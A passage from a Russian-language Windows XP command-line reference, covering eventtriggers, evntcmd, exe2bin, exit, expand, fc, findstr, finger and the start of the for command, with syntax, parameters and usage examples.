    Указание пароля учетной записи пользователя, заданной параметром /u.
/tid {код|*}
    Задание кодов удаляемых триггеров событий. Допускается использование подстановочного знака (*).
/?
    Отображение справки в командной строке.

Примеры

Далее приведены примеры использования команды eventtriggers /delete:

eventtriggers /delete /tid 1 /tid 2 /tid 4 /tid 6
eventtriggers /delete /s srvmain /u maindom\hiropln /p p@ssW23 /tid *
eventtriggers /delete /s srvmain /u maindom\hiropln /p p@ssW23 /tid 1

eventtriggers query

Запрос и отображение свойств и параметров триггера событий системы.
Синтаксис

eventtriggers[.exe] /query [/s компьютер [/u домен\пользователь [/p пароль]]] [/fo {TABLE|LIST|CSV}] [/nh] [/v]
Параметры

/s компьютер
    Задание имени или IP-адреса удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, заданного в параметре пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Указание пароля учетной записи пользователя, заданной параметром /u.
/fo {TABLE|LIST|CSV}
    Задание формата выходных данных запроса. Допустимые значения: TABLE, LIST и CSV. По умолчанию для выходных данных используется формат TABLE.
/nh
    Запрещение вывода заголовка столбца. Данный параметр является допустимым, если параметр /fo имеет значение TABLE или CSV.
/v
    Задание вывода подробных сведений в выходных данных. 
/?
    Отображение справки в командной строке.

Примеры

Далее приведены примеры использования команды eventtriggers /query:

eventtriggers /query
eventtriggers /query /s srvmain
eventtriggers /query /s srvmain /u maindom\hiropln /p p@ssW23 /fo list
Примечания
- Выполненная без операторов команда eventtriggers возвращается список триггеров событий. Чтобы вывести список триггеров событий, введите следующую команду:

eventtriggers

Вывод будет иметь следующий вид:


ID триггера Имя триггера событий Задание
========== ========================== ==============================================
 1 Очистка диска c:\windows\system32\cleanmgr.exe

- Если событие не удается выполнить, команда eventtriggers создает файл журнала TriggerConsumer.log, содержащий сообщение об ошибке триггера, в каталоге \windows\system32\wbem\logs. ========================================================================================
Evntcmd

Настройка преобразования событий в ловушки и/или в адреса назначения ловушки в файле конфигурации.
Синтаксис

evntcmd [/s ИмяКомпьютера] [/v УровеньОбъемаСведений] [/n] ИмяФайла
Параметры

/s ИмяКомпьютера
    Имя компьютера, на котором требуется настроить преобразование событий в ловушки и/или адреса назначения ловушки. Если компьютер не указан, настройка производится на локальном компьютере.
/v УровеньОбъемаСведений
    Типы сообщений состояния, отображающиеся в качестве настроенных ловушек и адресов назначения ловушек. Данный параметр должен быть целым числом от 0 до 10. Если указано число 10, то отображаются все типы сообщений, включая сообщения отслеживания и предупреждения о настройке ловушки. Если указано число 0, сообщения не отображаются.
/n
    Служба SNMP не должна перезапускаться, если на данный компьютер получены изменения настройки ловушки.
ИмяФайла
    Имя файла, который содержит сведения о преобразовании событий в настраиваемые ловушки и адреса назначения ловушки.
/?
    Отображает справку в командной строке.

Заметки
- Если требуется настроить ловушки, но не адреса назначения ловушки, можно создать допустимый файл конфигурации с помощью трансляции событий в ловушки, которая является графической утилитой. Если установлена служба SNMP, трансляцию событий в ловушки можно запустить, набрав в командной строке evntwin. После определения необходимых ловушек нажмите кнопку Экспорт, чтобы создать файл, который можно использовать с evntcmd. Трансляцию событий в ловушки можно использовать для легкого создания файла конфигурации и последующего использования файла конфигурации с evntcmd в командной строке для быстрой настройки ловушек на нескольких компьютерах.- Для настройки ловушки используется следующий синтаксис:

#pragma ADD ФайлЖурналаСобытий ИсточникСобытия КодСобытия [Счетчик [Период]]
- текст #pragma должен отображаться в начале каждой записи в файле;- параметр ADD указывает, что требуется добавить событие в настройку ловушки;- параметры ФайлЖурналаСобытий, ИсточникСобытия и КодСобытия являются обязательными. Параметр ФайлЖурналаСобытий указывает файл, в который записывается событие. Параметр ИсточникСобытия указывает приложение, которое создает событие. Параметр КодСобытия указывает уникальный номер, определяющий каждое событие. Чтобы определить, какие значения соответствуют конкретному событию запустите трансляцию событий в ловушки, набрав в командной строке evntwin. Нажмите кнопку Настройка, а затем кнопку Изменить. В области Источники событий просмотрите папки, пока не найдете событие, которое требуется настроить, щелкните событие, а затем нажмите кнопку Добавить. Сведения об источнике события, файл журнала события и код события соответственно отображаются в областях Источник, Журнал и Код ловушки; - параметр Счетчик является необязательным; он указывает количество событий перед отправкой сообщения ловушки. Если параметр Счетчик не используется, сообщения ловушки отправляется после первого событие;- параметр Период является необязательным, но он требует использования параметра Счетчик. Параметр Период указывает продолжительность времени (в секундах), в течение которого событие должно произойти число раз, указанное в параметре Счетчик, перед отправкой сообщения ловушки. Если параметр Период не используется, сообщение ловушки отправляется после того, как событие произойдет число раз, указанное в параметре Счетчик, не зависимо от того, сколько времени прошло между событиями. - Для удаления ловушки используется следующий синтаксис:

#pragma DELETE ФайлЖурналаСобытий ИсточникСобытия КодСобытия
- текст #pragma должен отображаться в начале каждой записи в файле;- параметр DELETE указывает, что требуется удалить событие из настройки ловушки;- параметры ФайлЖурналаСобытий, ИсточникСобытия и КодСобытия являются обязательными. Параметр ФайлЖурналаСобытий указывает журнал, в который записывается событие. Параметр ИсточникСобытия указывает приложение, которое создает событие. Параметр КодСобытия указывает уникальный номер, определяющий каждое событие. - Для настройки адреса назначения ловушки используется следующий синтаксис:

#pragma ADD_TRAP_DEST ИмяСообщества НомерУзла
- текст #pragma должен отображаться в начале каждой записи в файле;- параметр ADD_TRAP_DEST указывает, что требуется отправить сообщения ловушки на конкретный узел внутри сообщества;- параметр ИмяСообщества указывает по имени сообщество, в которое отправляется сообщение ловушки;- параметр НомерУзла указывает по имени или IP-адресу узел, на который требуется отправить сообщения ловушки. - Для удаления адреса назначения ловушки используется следующий синтаксис:

#pragma DELETE_TRAP_DEST ИмяСообщества НомерУзла
- текст #pragma должен отображаться в начале каждой записи в файле;- параметр DELETE_TRAP_DEST указывает, что не требуется отправлять сообщения ловушки на конкретный узел внутри сообщества;- параметр ИмяСообщества указывает по имени сообщество, в которое отправляются сообщения ловушки;- параметр НомерУзла указывает по имени или IP-адресу узел, на который не требуется отправлять сообщения ловушки.
Примеры

Следующие примеры показывают записи в файле конфигурации для команды evntcmd. Они не могут быть введены в командной строке.

Чтобы отправить сообщение ловушки, если служба журнала событий перезапускается, введите:

#pragma ADD System "Eventlog" 2147489653

Чтобы отправить сообщение ловушки, если служба журнала событий перезапускается дважды за три минуты, введите:

#pragma ADD System "Eventlog" 2147489653 2 180

Чтобы остановить отправку сообщения ловушки, когда бы ни перезапускалась служба журнала событий, введите:

#pragma DELETE System "Eventlog" 2147489653

Чтобы отправить сообщения ловушки в сообщество с названием «Public» на узел с IP-адресом 192.168.100.100, введите:

#pragma ADD_TRAP_DEST public 192.168.100.100

Чтобы отправить сообщения ловушки в сообщество с названием «Private» на узел с названием «Host1», введите:

#pragma ADD_TRAP_DEST private Host1

Чтобы остановить отправку сообщений ловушки в сообщество с названием «Private» на тот же компьютер, на котором настраиваются адреса назначений ловушки, введите:

#pragma DELETE_TRAP_DEST private localhost
========================================================================================
Exe2bin

Преобразование исполняемых файлов (.exe) в двоичный формат.
Синтаксис

exe2bin [диск1:][путь1]ФайлВвода [[диск2:][путь2]ВыходнойФайл]
Параметры

[диск1:][путь1]ФайлВвода
    Местонахождение и имя файла ввода, который требуется преобразовать. Параметр ФайлВвода является обязательным.
[диск2:][путь2]ВыходнойФайл
    Местонахождение и имя выходного файла, который требуется создать. 
/?
    Отображение справки в командной строке.

Заметки
- Программа Exe2bin включена для помощи разработчикам программ. Она не предназначена для обычных пользователей. - При использовании команды exe2bin имеют место следующие ограничения: - входной файл должен быть в корректном .exe формате, полученном после компоновки и не должен быть упакованным;- резидентная или действующая (код и данные) часть файла не должны превышать объема в 64Кб;- в файле не должно быть сегмента stack. - Программа Exe2bin выполняет конкретные действия, в зависимости от значений параметров ФайлВвода и ВыходнойФайл: - по умолчанию для параметра ФайлВвода используется расширение .exe. Программа Exe2bin преобразует ФайлВвода .exe в файл с двоичным форматом .bin (образ программы в памяти) и использует местоположение и имя, заданные параметрами [диск2:][путь2]ВыходнойФайл для хранения выходного файла;- если не заданы диск2 или путь2, программа exe2bin записывает выходной файл на текущий диск и в текущий каталог;- если имя файла для параметра ВыходнойФайл не указано, программа exe2bin использует имя файла параметра ФайлВвода;- по умолчанию для имени файла, указанного для параметра ВыходнойФайл, используется расширение .bin. - Поддерживаются следующие типы преобразования: - если значения CS:IP не заданы в .exe файле, exe2bin выполняет чисто двоичное преобразование. Если программа содержит инструкции, требующие отзыва сегмента, exe2bin запрашивает значение исправления. Это значение исправления является абсолютным адресом сегмента, в который должна быть загружена программа. Итоговая программа может быть использована, только будучи загруженной по этому адресу, задаваемому вызывающей программой. Командный интерпретатор не сможет загрузить такую программу;- если значения сегментов CS:IP установлены в 0000:100H, итоговый двоичный файл будет вызываться как .com файл с указателем инструкций, установленным в 100H ассемблерной командой ORG. Включите расширение .com в параметр ВыходнойФайл. Исправления сегментов не разрешены, поскольку файлы с расширением .com должны иметь возможность перемещения сегментов. Файлы с расширением .com должны принимать условия ввода, изложенные в документации Microsoft Macro Assembler. Командный интерпретатор будет загружать и запускать программу так же, как и обычные .com программы, поставляемые на диске Windows XP. ========================================================================================
Exit

Выход из текущего пакетного сценария или из программы Cmd.exe (командный интерпретатор) и возвращение в программу, запустившую Cmd.exe или в диспетчер программ.
Синтаксис

exit [/b] [КодВыхода]
Параметры

/b
    Выход из текущего пакетного сценария. 
КодВыхода
    Число.
/?
    Отображение справки в командной строке.

Заметки
- Если /b используется вне пакетного сценария, то выход осуществляется из Cmd.exe.- Если используется /b, то Cmd.exe устанавливает ERRORLEVEL в указанный КодВыхода. При выходе из Cmd.exe, Cmd.exe устанавливает код процесса выхода вместе с параметром КодВыхода. 
========================================================================================
Expand

Восстановление одного или нескольких сжатых файлов. Эта команда используется для развертывания уплотненных файлов с дистрибутивных дисков.
Синтаксис

expand [-r] Источник [Результат]

expand -d источник.cab [-f:файлы]

expand источник.cab -f:файлы Результат
Параметры

-r
    Переименовывает развернутые файлы.
-d
    Выводит список файлов в местоположении источника. Не производит распаковки или выделения файлов.
-f:файлы
    Указывает файлы в cab-файле, которые необходимо распаковать. Можно использовать подстановочные символы (* and ?).
Источник
    Задает файл, который должен быть развернут. Параметр источник может состоять из имени диска с двоеточием, имени папки, имени файла или их комбинации. Можно использовать подстановочные символы (* and ?).
Назначение
    Задает, куда помещать развернутые файлы. Если параметр Источник задает несколько файлов и ключ -r не задан, Результат должен быть каталогом. Параметр результат может состоять из имени диска с двоеточием, имени каталога, имени файла или их комбинации.
/?
    Отображение справки в командной строке.

Заметки
- Использование команды expand в консоли восстановления

Команда expand с другими параметрами доступна в консоли восстановления.
========================================================================================
Fc

Сравнение двух файлов и вывод различий между ними.
Синтаксис

fc [/a] [/b] [/c] [/l] [/lbn] [/n] [/t] [/u] [/w] [/nnnn] [диск1:][путь1]имяфайла1 [диск2:][путь2]имяфайла2
Параметры

/a
    Задает сокращенный вывод ASCII сравнения. Вместо вывода фсех различающихся строк, fc выводит только начальную и конечную строки отличающихся участков.
/b
    Сравнивает файлы в двоичном режиме. Команда fc сравнивает два файла байт за байтом и не пытается сопоставить файлы после найденного отличия. Этот режим используется по умолчанию для сравнения файлов с расширениями: .exe, .com, .sys, .obj, .lib или .bin.
/c
    Сравнивает без учета заглавных и строчных букв.
/l
    Сравнивает файлы в текстовом (ASCII) режиме. Команда fc сравнивает два файла строка за строкой и пытается сопоставить их, после того как найдено отличие. Этот режим используется по умолчанию для сравнения файлов, исключая файлы со следующими расширениями: .exe, .com, .sys, .obj, .lib или .bin.
/lbn
    Задает количество строк n для внутреннего буфера. По умолчанию длина буфера составляет 100 строк. Если количество отличающихся строк в сравниваемых файлах превышает это число, команда fc прекращает сравнение.
/n
    Задает вывод номеров строк при сравнении в текстовом режиме.
/t
    Предотвращение fc от преобразования меток табуляции в пробелы. По умолчанию табуляторы заменяются пробелами с остановкой в каждой восьмой позиции.
/u
    Задает сравнение файлов в текстовом формате Юникод.
/w
    Задает сжатие пробелов и табуляций при сравнении. Если в строке содержится несколько пробелов или табуляций подряд, при использовании ключа /w они будут рассматриваться как один. Когда используется ключ /w, программа fc игнорирует (и не сравнивает) пробелы и табуляции в начале и в конце строки.
/nnnn
    Задает количество совпадающих строк, используемых программой fc при новом сопоставлении файлов. Если количество совпадающих строк в файле меньше nnnn, программа fc будет выводить совпадающие строки как отличающиеся. По умолчанию значение равно 2.
[диск1:][путь1]имяфайла1
    Задает местоположение и имя первого файла для сравнения. Параметр имяфайла1 является обязательным.
[диск2:][путь2]имяфайла2
    Задает местоположение и имя второго файла для сравнения. Параметр имяфайла2 является обязательным.
/?
    Отображение справки в командной строке.

Заметки
- Вывод различий между файлами при текстовом сравнении в формате ASCII

При использовании программы fc для сравнения ASCII, fc отображает различия между двумя файлами в следующем порядке:
- имя первого файла;- строки из параметра имяфайла1, которые отличаются в файлах;- первая строка, совпадающая в обоих файлах;- имя второго файла;- отличающиеся строки из параметра имяфайла2;- первая строка совпадения. - Использование /b для двоичного сравнения

/b отображает несоответствия, найденные в течение двоичного сравнения, как показано ниже.

xxxxxxxx: yy zz

Величина xxxxxxxx задает относительный шестнадцатеричный адрес пары различающихся байтов, отсчитываемый от начала файла. Адресация начинается с 00000000. Шестнадцатеричные величины yy и zz представляют различающиеся байты из имяфайла1 и имяфайла2 соответственно.
- Использование подстановочных знаков

Можно использовать подстановочные знаки (* and ?) в параметрах имяфайла1 и имяфайла2. Если они использованы при задании первого файла имяфайла1, программа fc будет сравнивать все заданные файлы с файлом, указанным в параметре ИмяФайла. Если подстановочные знаки использованы при задании файла имяфайла2, fc при сравнении будет использовать соответствующие значения параметра имяфайла1.
- Работа с памятью

При сравнении в текстовом режиме программа fc использует внутренний буфер (достаточный для размещения 100 строк). Если размер файлов больше размера буфера, программа fc будет сравнивать те части, которые поместились в буфер. Если fc не обнаруживает совпадения в загруженных частях файлов, программа остановится и будет выведено следующее сообщение:

Не удается выполнить синхронизацию строк. Слишком много различий между файлами.

Если же выполняется двоичное сравнение и размер файлов превосходит размер доступной памяти, fc выполняет сравнение полностью. При необходимости, файлы будут считываться с диска по частям. Вывод команды при этом не будет отличаться от вывода в случае полного размещения файлов в памяти.
Примеры

Чтобы сравнить два текстовых файла с именами Monthly.rpt и Sales.rpt и вывести результат в сокращенном формате, введите:

fc /a monthly.rpt sales.rpt

Для двоичного сравнения двух пакетных файлов Profits.bat и Earnings.bat введите:

fc /b profits.bat earnings.bat

Результат будет иметь следующий вид:

00000002: 72 43
00000004: 65 3A
0000000E: 56 92
00000012: 6D 5C
00000013: 0D 7C
00000014: 0D 0A
00000015: 0A 0D
0000001E: 43 7A
0000001F: 09 0A
00000022: 72 44
...
...
...
000005E0: 00 61
000005E1: 00 73
000005E2: 00 73
000005E3: 00 69
000005E4: 00 67
000005E5: 00 6E
000005E6: 00 6D
000005E7: 00 65
000005E8: 00 6E
FC: Earnings.bat длиннее, чем Profits.bat

Если файлы Profits.bat и Earnings.bat одинаковы, fc выводит на экран следующее сообщение:

FC: различия не найдены

Для сравнения каждого файла .bat в текущем каталоге с файлом New.bat введите:

fc *.bat new.bat

Для сравнения файла New.bat на диске C с файлом New.bat на диске D введите:

fc c:new.bat d:*.bat

Для сравнения каждого пакетного файла в корневом каталоге диска C с файлом с таким же именем в корневом каталоге на диске введите:

fc c:*.bat d:*.bat
========================================================================================
Fcbs

Задание числа блоков управления файлом (FCB), которые могут быть одновременно открыты подсистемой MS-DOS. Для указания числа FCB используйте файл системный_корневой_каталог\System32\Config.nt или эквивалентный файл запуска, заданный в PIF-файле.
Синтаксис

fcbs=x
Параметры

x
    Обязательный параметр. Задает число блоков управления, которые подсистема MS-DOS может открыть одновременно. Допустимыми являются значения x от 1 до 255. Значение по умолчанию равно 4.
/?
    Отображение справки в командной строке.

Заметки
- Блок управления файлом является структурой данных, в которой хранится информация о файле. - Если программа пытается открыть более x файлов с использованием блоков управления файлом, подсистема MS-DOS может закрыть файлы, которые были открыты ранее. - Следует использовать команду fcbs только тогда, когда этого требует какая-либо программа. Большинство современных программ не требуют использования блоков управления файлом. Однако для работы некоторых старых программ требуется поместить команду fcbs в файл Config.nt.
Примеры

Чтобы разрешить подсистеме MS-DOS открывать до восьми файлов одновременно с использованием блоков управления файлом, в файл Config.nt необходимо включить следующую команду:

fcbs=8
========================================================================================
Files

Задание количества файлов, к которым подсистема MS-DOS может иметь доступ одновременно. Для указания параметра файлы используйте файл системный_корневой_каталог\System32\Config.nt или эквивалентный файл запуска, заданный в PIF-файле.
Синтаксис

files=x
Параметры

x
    Обязательный параметр. Указание количества файлов, к которым подсистема MS-DOS может иметь доступ одновременно. Допустимыми являются значения x от 8 до 255. Значение по умолчанию равно 8.
/?
    Отображение справки в командной строке.

Заметки
- Хотя значение по умолчанию x равно 8, некоторые программы требуют большего значения. Типовым значением является 20.
Примеры

Чтобы разрешить подсистеме MS-DOS иметь доступ одновременно к 20 файлам, в файл Config.nt должна быть включена следующая команда:

files=20
========================================================================================
Использование фильтров

Фильтр команды используется с символом перенаправления канала команды (|) и является командой внутри команды, которая считывает ввод команды, преобразовывает ввод, а затем записывает выход. Команды-фильтры дают возможность сортировать, просматривать и отбирать часть выходной информации других команд.

Фильтры делят, переупорядочивают или выделяют отдельные части из проходящей через них информации. В приведенной ниже таблице перечислены команды-фильты, доступные в Microsoft Windows XP.
Команда     Описание
more     Отображает содержимое файла или вывода команды в одном окне командной строки за раз.
find     Поиск указанных символов в файлах и выходе команды.
sort     Сортировка файлов и выхода команды по алфавиту.

Для направления данных из файла на вход фильтра используется символ «меньше» (<). Для направления на вход фильтра выхода другой команды используется канал (|).
Использование команды more

Команда more выводит содержимое файла или выхода команды в одном окне командной строки за раз. Например, чтобы отобразить содержимое файла List.txt в одном окне командной строки за раз, введите следующую команду:

more < list.txt

Отображается одно окно командной строки со сведениями, а затем в нижней части окна командной строки отображается строка -- More --. Для перехода к следующему окну командной строки, нажмите любую клавишу на клавиатуре, кроме клавиши PAUSE. Для остановки просмотра следует ввести комбинацию CTRL+C.

Команда more полезна при работе с командами, создающими выход более одного окна командной строки. Например, при выводе дерева каталогов жесткого диска. Если на диске содержится больше каталогов, чем может быть одновременно выведено в окне командной строки, можно использовать команду tree с каналом (|) и команду more.

tree c:\ | more

На экран будет выведен первое окно командной строки с выходом команды tree, а затем отобразится строка -- More --. Выход будет ожидать нажатия любой клавиши для продолжения (кроме клавиши PAUSE).
Использование команды find

Команда find проводит поиск заданной строки или текста в файлах. Команда Cmd.exe отображает каждую строку, которая совпадает со строкой или текстом, указанным в окне коммандной строки. Команда find может быть использована как команда-фильтр и как обычная команда Microsoft Windows XP. Дополнительные сведения об использовании команды find в качестве стандартной команды см. в разделе Find.

Чтобы использовать команду find в качестве команды-фильтра, необходимо включить символ «меньше» (<) и строку или текст, в котором требуется выполнить поиск. По умолчанию при поиске команда find учитывает регистр. Например, следующая команда будет искать строку "Pacific Rim" в файле Trade.txt:

find "Pacific Rim" < trade.txt

Выход не включает вхождение строки "pacific rim". Встречается вхождение строки "Pacific Rim" с прописными буквами.

Для сохранения результатов работы команды find (вместо отображения их в окне командной строки), введите символ «больше» (>) и имя файла, в котором требуется хранить выход. Например, следующая команда ищет строку "Pacific Rim" в файле Trade.txt с сохранением результата в файле Nwtrade.txt:

find "Pacific Rim" < trade.txt > nwtrade.txt
Использование команды sort

Команда sort выполняет сортировку по алфавиту текстового файла или выхода команды. Например, следующая команда сортирует содержимое файла List.txt и отображает результаты в окне командной строки:

sort < list.txt

В этом примере команда sort сортирует строки файла List.txt в алфавитном порядке и выводит результат на экран без изменения файла. Для сохранения результатов работы команды sort (вместо их отображения) введите символ «больше» (>) и имя файла. Например, следующую команду можно использовать для алфавитной сортировки строк файла List.txt и сохранения результатов в файле Alphlist.txt:

sort < list.txt > alphlist.txt

Для сортировки вывода команды следует ввести команду, затем символ канала (|) и команду sort (команда | sort). Например, следующая команда сортирует в алфавитном порядке строки, которые содержат слово "Jones" (вывод команды find):

find "Jones" maillst.txt | sort
========================================================================================
Find

Поиск заданной строки текста в файле или нескольких файлах. После поиска в заданных файлах команда find выведет на экран все строки из этих файлов, содержащие заданный образец.
Синтаксис

find [/v] [/c] [/n] [/i] "строка" [[диск:][путь]ИмяФайла[...]]
Параметры

/v
    Выводит все строки, не содержащие строку, заданную параметром строка.
/c
    Подсчет строк, содержащих строку, указанную параметром строка, и отображение общего количества.
/n
    Выводит номера строк перед самими строками.
/i
    Задает поиск без различия строчных и заглавных букв.
"строка_поиска"
    Обязательный параметр. Указывает группу символов, поиск которой будет производиться. Необходимо заключить параметр строка в кавычки ("строка").
[диск:][путь] ИмяФайла
    Задает местоположение и имя файла, в котором будет производиться поиск заданной строки символов.
/?
    Отображение справки в командной строке.

Заметки
- Задание строки

Если ключ /i не указан, команда find ищет именно то, что указано в параметре строка. Например, для команды find символы "a" и "A" являются различными. Если используется ключ /i, команда find не различает строчные и прописные буквы, и символы "a" и "A" являются одинаковыми.

Если строка поиска содержит кавычки, при вызове команды каждая кавычка в строке поиска должна быть заменена двумя символами кавычек ("СтрокаСодержания""Кавычки").
- Использование команды find в качестве фильтра

Если имя файла пропущено, find действует как фильтр, получая ввод из стандартного источника вывода (обычно клавиатура, канал или файл перенаправления), и выводит все строки, содержащие параметр строка.
- Порядок синтаксиса команды

Параметры и ключи команды find могут быть заданы в произвольном порядке.
- Использование подстановочных знаков

Подстановочные знаки (* и ?) не могут быть использованы в именах файлов и расширениях, задаваемых в команде find. Чтобы искать строку в множестве файлов, указанных с помощью подстановочных знаков, можно использовать команду find в команде for.
- Использование ключей /v или /n с ключом /c

Если в одной команде заданы ключи /c и /v, команда find выведет на экран количество строк, которые не содержат заданную строку поиска. Если в одной команде указаны оба ключа: /c и /n, команда find игнорирует ключ /n.
- Использование команды find со знаками перевода строки

Команда find не распознает символ перевода строки. Когда команда find используется для поиска текста в файле, который содержит символы перевода строки, необходимо ограничить строку поиска текстом, который может быть найден между символами перевода строки (строка не может прерываться символом перевода строки). Например, find не найдет совпадение для строки "файл налогов" если перевод строки в файле стоит между словами "файл" и "налогов".
Примеры

Для вывода всех строк из файла Pencil.ad, которые содержат слова «Точилка» служит следующая команда:

find "Точилка" pencil.ad

Для поиска строки, содержащей текст, указанный в кавычках, необходимо сначала заключить в кавычки всю строку. Во-вторых, необходимо использовать двойные кавычки для каждых кавычек, содержащихся в строке. Поиск Ученый пометил свой документ ""только для дискуссии"". Это не окончательный отчет." В Report.doc введите:

find "Ученый пометил свой документ ""только для дискуссии."" Это не окончательный отчет." report.doc

Если поиск требуется провести в нескольких файлах, следует использовать команду find с командой for. Для поиска файлов с расширением .bat, содержащих строку "PROMPT", можно использовать следующую команду:

for %f in (*.bat) do find "PROMPT" %f

Для поиска на жестком диске C файлов, содержащих строку "CPU" и отображения их имен используйте символ канала (|), чтобы направить результаты команды dir в команду find:

dir c:\ /s /b | find "CPU"

Так как команда find проводит поиск, различая строчные и заглавные буквы, а команда dir выводит результаты заглавными буквами, необходимо задать строку "CPU" заглавными буквами или использовать ключ /i в команде find.
========================================================================================
Findstr

Поиск образцов текста в файлах с использованием регулярных выражений.
Синтаксис

findstr [/b] [/e] [/l] [/r] [/s] [/i] [/x] [/v] [/n] [/m] [/o] [/p] [/offline] [/g:файл] [/f:файл] [/c:строка] [/d:СписокКаталогов] [/a:АтрибутЦвета] [строки] [[диск:][путь] ИмяФайла [...]]
Параметры

/b
    Сравнивает шаблон с началом строки.
/e
    Сравнивает шаблон с концом строки.
/l
    Использует заданную строку буквально.
/r
    Использует строку поиска как регулярное выражение. Команда Findstr интерпретирует все метасимволы как регулярные выражения, если не используется ключ /l.
/s
    Задает поиск файлов в текущем каталоге и его подкаталогах.
/i
    Задает поиск без различия строчных и заглавных букв.
/x
    Печатает точно совпавшие строки.
/v
    Печатает строки, не содержащие совпадений.
/n
    Печатает в начале совпавшей строки ее номер.
/m
    Печатает только имя файла при обнаружении совпадения.
/o
    Печатает смещение перед выводом строки с совпадением.
/p
    Пропускает файлы с непечатаемыми символами.
/offline
    Обработка файлов с автономным атрибутом.
/f:файл
    Читает список из заданного файла.
/c:строка
    Использует заданный текст как литеральную строку поиска.
/g:файл
    Получает строки поиска из заданного файла.
/d:СписокКаталогов
    Ищет в списке каталогов, разделенном запятыми.
/a:АтрибутЦвета
    Задает атрибуты цвета двумя шестнадцатеричными цифрами.
строки
    Текст, поиск которого производится в файле, заданном параметром ИмяФайла.
[диск:][путь] ИмяФайла [...]
    Файл или несколько файлов для поиска.
/?
    Отображение справки в командной строке.

Заметки
- Использование регулярных выражений с командой findstr

Команда findstr способна выполнять точный поиск текста в любом текстовом файле или файлах формата ASCII. Однако иногда имеется только часть информации, которая должна быть найдена, или требуется найти информацию в широком диапазоне. В таких случаях команда findstr предоставляет мощную возможность поиска с использованием регулярных выражений.

В противоположность точному заданию строки символов для поиска, регулярные выражения позволяют задать образец текста. Для задания образца используются литералы и метасимволы. Каждый символ, который не имеет специального значения в регулярных выражениях, рассматривается как литерал и должен точно совпасть при поиске. Например, буквы и цифры являются литеральными символами. Метасимволы — это символы со специальным значением (оператор или разделитель) в регулярных выражениях.

В приведенной ниже таблице перечислены метасимволы, допустимые для команды findstr.
Символ     Значение
.     Подстановочный знак: любой символ
*     Повтор: ноль или более предшествующих символов или классов символов.
^     Позиция строки: начало строки
$     Позиция строки: конец строки
[класс]     Класс символа: любой символ из множества
[^класс]     Инвертированный класс: любой символ из множества
[x-y]     Диапазон: любой символ из диапазона
\x     Исключение: использование метасимвола x в качестве литерала
\<xyz     Позиция слова: начало слова
xyz\>     Позиция слова: конец слова

Специальные символы в регулярных выражениях дают наилучший результат при совместном использовании. Например, при комбинации символа подстановки (.) и повторителя (*) совпадает любая строка символов:

.*

Используйте следующее выражение как часть более объемного выражения, которое совпадает со строкой, начинающейся с "b" и оканчивающейся на "ing":

b.*ing
Примеры

Для отделения строк поиска друг от друга следует использовать пробелы, кроме тех случаев, когда задан ключ /c. Для поиска слова "hello" или "there" в файле x.y введите следующую каманду:

findstr "hello there" x.y

Для поиска словосочетания "hello there" в файле x.y введите следующую каманду:

findstr /c:"hello there" x.y

Для поиска всех слов "Windows" (с первой заглавной буквой W) в файле Proposal.txt может быть использована следующая команда:

findstr Windows proposal.txt

Для поиска в каждом файле текущего каталога и в файлах всех подкаталогов слова "Windows" без учета строчных и заглавных букв может быть использована следующая команда:

findstr /s /i Windows *.*

Для поиска всех строк, содержащих слово "FOR", перед которым идет несколько пробелов (чтобы найти в программе оператор цикла), с выводом номера каждой строки можно использовать команду:

findstr /b /n /c:" *FOR" *.bas

Если требуется найти несколько разных наборов символов в нескольких файлах, можно создать текстовый файл, каждая строка которого содержит образец для поиска. Также можно задать точный список файлов, если поиск будет производиться в текстовых файлах. Для использования файла Finddata.txt, содержащего образцы для поиска, файла Filelist.txt, содержащего список файлов, в которых будет производиться поиск, и записи результатов работы программы в файл Results.out служит следующая команда:

findstr /g:finddata.txt /f:filelist.txt > results.out

Предположим, необходимо найти каждый файл в текущем каталоге и его подкаталогах, содержащий слово "computer" без различия строчных и заглавных букв. Для вывода списка таких файлов можно использовать следующую команду:

findstr /s /i /m "\<computer\>" *.*

Теперь, предположим, требуется найти не только само слово "computer", но и все другие слова, начинающиеся с тех же букв, таких как "compliment" и "compete". Введите следующую команду:

findstr /s /i /m "\<comp.*" *.*
========================================================================================
Finger

Отображает сведения о пользователе или пользователях конкретного удаленного компьютера (обычно с операционной системой UNIX), запускающего службу Finger или демон. Удаленный компьютер указывает формат и вывод экрана сведений пользователя. Запущенная без параметров, команда finger выводит справку.
Синтаксис

finger [-l] [пользователь] [@узел] [...]
Параметры

-l
    Выводит сведения пользователя в форме длинного списка.
Пользователь
    Задает пользователя, информация о котором будет получена. Если параметр пользователь не задан, командой finger будет выведена информация обо всех пользователях на указанном компьютере.
@узел
    Удаленный компьютер, запускающий службу Finger, на котором производится поиск сведений пользователя. Можно указать имя компьютера или IP-адрес.
/?
    Отображение справки в командной строке.

Заметки
- Может быть указано несколько параметров пользователь@узел. - Перед параметром finger необходимо поместить дефис (-), а не косую черту (/). - Эта команда доступна, только если в свойствах сетевого адаптера в объекте Сетевые подключения в качестве компонента установлен протокол Интернета (TCP/IP). - Операционные системы Microsoft Windows 2000 и Microsoft Windows XP не предоставляют службу finger.
Примеры

Чтобы отобразить сведения для user1 на компьютере users.microsoft.com, введите следующую команду:

finger user1@users.microsoft.com

Чтобы отобразить сведения для всех пользователей на компьютере users.microsoft.com, введите следующую команду:

finger @users.microsoft.com
========================================================================================
For

Запуск некоторой команды для каждого файла из заданного множества.
Синтаксис

for {%переменная|%%переменная} in (множество) do команда [ПараметрыКоманднойСтроки]
Параметры

{%переменная|%%переменная}
    Обязательный параметр. Замещаемый параметр. Используйте %переменная для выполнения команды for из командной строки. Используйте %%переменная для выполнения команды for в пакетном файле. Переменные учитывают регистр и могут быть представлены со значением альфа, например, %A, %B или %C.
(множество)
    Обязательный параметр. Задает один или несколько файлов, каталогов, диапазон значений или текстовых строк, подлежащих обработке заданной командой. Скобки являются обязательными.
команда
    Обязательный параметр. Задает команду, которая будет выполнена для каждого файла, каталога диапазона значений или текстовой строки, включенной в указанный параметр (множество).
ПараметрыКоманднойСтроки
    Задает параметры командной строки, которые используются с указанной командой.
/?
    Отображение справки в командной строке.

Заметки
- Использование программы for

Команда for может быть использована в пакетном файле или непосредственно из командной строки.
- Использование параметров командной строки пакетного файла

Перечисленные ниже атрибуты применяются к команде for.
